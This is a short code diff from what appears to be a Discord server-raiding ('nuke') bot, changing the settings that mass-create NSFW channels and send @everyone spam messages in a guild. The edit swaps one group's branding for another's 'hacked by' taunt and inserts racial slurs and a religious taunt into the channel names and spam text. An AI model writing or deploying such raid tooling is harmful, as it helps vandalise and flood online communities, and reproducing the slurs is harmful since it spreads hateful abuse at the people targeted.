@@ -7,13 +7,13 @@ export default {
         if(!kmsg.guild) return;
         let ops = { 
             channels: {
-                name: "kingman",
+                name: "hacked by MIDNIGHT STORM NIGGAS",
                 nsfw: true,
                 number: Number(args[0]) || 100,
-                topic: "KINGMAN HERE SAY GOODNIGHT :)"
+                topic: "GET HACKED YA ALLAH :)"
             },
             messages: {
-                content: args.slice(2).join(" ") || "> @everyone **KINGMAN NUKE SYSTEM [KINGMAN_DEV](https://discord.gg/kingmandev)**",
+                content: args.slice(2).join(" ") || "> @everyone **HAHAHAHHAHAHAHAH [niggers]nah nah midnight storm ontop)**",
                 number: Number(args[1]) || 25
             }
         }
